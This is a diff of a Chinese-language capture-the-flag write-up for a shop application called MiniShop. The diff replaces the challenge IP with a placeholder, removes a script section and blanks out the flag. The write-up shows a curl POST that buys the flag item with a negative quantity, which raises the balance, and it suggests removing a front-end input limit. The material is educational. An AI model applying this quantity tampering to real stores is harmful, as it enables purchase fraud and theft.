@@ -4,7 +4,7 @@
 
 ## 题目
 
-- 入口：`http://47.120.76.57:34940`
+- 入口：`http://目标地址`
 - 应用：MiniShop，初始余额 ¥100
 - 商品：可乐 ¥5、iPhone ¥9999、机密物料(flag) ¥100000
 - 接口：`POST /buy`，参数 `item`、`qty`，成功买到 `flag` 商品即返回 flag
@@ -27,15 +27,21 @@ if ($balance >= 0) { 发货; }
 ## 手工复刻（curl 一发入魂）
 
 ```bash
-curl -s -X POST http://47.120.76.57:34940/buy \
+curl -s -X POST http://目标地址/buy \
      -d 'item=flag&qty=-1'
 ```
 
 返回：
 
 ```json
-{"ok":true,"balance":100100,"bought":"机密物料","qty":-1,
- "total":-100000,"flag":"TOGOGO-flag{...}"}
+{
+  "ok": true,
+  "balance": 100100,
+  "bought": "机密物料",
+  "qty": -1,
+  "total": -100000,
+  "flag": "TOGOGO-flag{...}"
+}
 ```
 
 ## 浏览器手工版
@@ -46,18 +52,10 @@ curl -s -X POST http://47.120.76.57:34940/buy \
 
 > 如果前端做了 `min=1` 限制，直接用 DevTools 删掉属性，或者用上面 curl。
 
-## 一键脚本
-
-```bash
-python3 main.py
-# 或指定地址
-python3 main.py http://47.120.76.57:34940
-```
-
 ## Flag
 
 ```
-TOGOGO-flag{4cf71b76-8c20-4705-9108-fb9d7d41f25e}
+TOGOGO-flag{}
 ```
 
 ## 防御建议
